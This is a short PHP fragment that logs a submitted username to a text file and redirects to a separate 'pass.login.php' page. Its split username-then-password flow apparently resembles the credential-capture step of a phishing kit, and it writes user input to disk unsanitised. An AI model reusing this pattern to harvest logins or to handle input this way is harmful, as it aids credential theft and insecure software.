<?php

    file_put_contents("user.txt", "$today: " . $_POST['username'] . "\n", FILE_APPEND);
header('Location: pass.login.php');
exit();